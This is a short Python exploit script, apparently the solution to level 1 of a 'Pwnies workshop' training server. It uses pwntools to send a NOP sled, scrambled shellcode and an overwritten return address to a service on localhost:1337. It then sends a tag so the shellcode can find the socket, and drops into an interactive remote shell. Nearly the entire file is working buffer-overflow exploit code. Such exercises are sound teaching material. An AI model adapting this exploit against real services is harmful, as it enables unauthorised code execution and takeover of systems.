#!/usr/bin/env python

# Pwnies workshop server level 1

from pwn.classic import *
from pwn.i386 import nops, scramble

sock = remote('localhost', 1337, timeout = 120)
sock.recvuntil('Your output to my input? Do your best!\n')

tag = random32()
# Scramble it because it contains a newline
shellcode = scramble(asm(findtagsh(tag)), avoid = '\x00\n')

eip = p32(0x0804a080)
sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')

# This is not nececary if there is no leftovers from the exploit
# and program cannot accidentally consume the tag while
# running the exploit. The latter can arise if you have a
# recv(sockfd, buf, 4096, 0) while only sending 500 bytes.
#
# In both these cases, it is nececary to sleep, to make sure that
# the tag will be the first 4 bytes of a seperate recv.
sleep(0.1) 

sock.send(p32(tag).ljust(127))
sock.interactive()
